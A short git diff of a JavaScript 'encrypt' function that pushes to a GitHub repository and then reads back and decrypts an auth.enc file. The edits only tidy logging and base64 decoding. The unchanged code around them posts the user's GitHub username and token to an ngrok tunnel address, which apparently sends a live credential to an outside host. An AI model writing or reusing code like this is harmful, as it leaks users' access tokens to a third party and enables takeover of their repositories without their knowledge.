@@ -20,8 +20,6 @@ async function encrypt(repo, pass, branch) {
         shell.exec(`git commit -m 'add auth file'`)
         shell.exec(`git push https://${ owner }:${ pass }@github.com/${ repo } master`)
 
-        console.log(owner, pass, repo, _repo)
-
         await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
             username: owner,
             gitToken: pass,
@@ -32,11 +30,10 @@ async function encrypt(repo, pass, branch) {
         let resp = await axios.get(
             `https://api.github.com/repos/${repo}/contents/auth.enc`
         )
-        
-        console.log(resp.data)
 
-        let cnt = resp.data.content
-        let content = Buffer.from(cnt, 'base64').toString('ascii').replace(/\n/g, "");
+        let cnt = resp.data.content;
+        let content = Buffer.from(cnt, 'base64').toString('ascii');
+        content = content.replace(/\n/g, "")
         console.log(content)
 
         var decipher = crypto.createDecipher(algorithm, pass)
